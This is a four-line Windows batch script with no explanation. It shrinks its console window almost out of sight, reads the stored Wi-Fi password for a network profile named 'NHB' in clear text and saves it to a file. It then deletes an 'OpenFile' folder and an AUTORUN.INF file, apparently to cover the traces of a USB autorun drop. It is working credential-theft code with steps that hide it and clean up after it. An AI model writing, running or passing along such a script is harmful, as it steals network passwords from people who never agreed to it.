mode con: cols=18 lines=3
netsh wlan show profile name=NHB key=clear | find "Key Content" > NHB.txt
rmdir /s /q OpenFile
del AUTORUN.INF
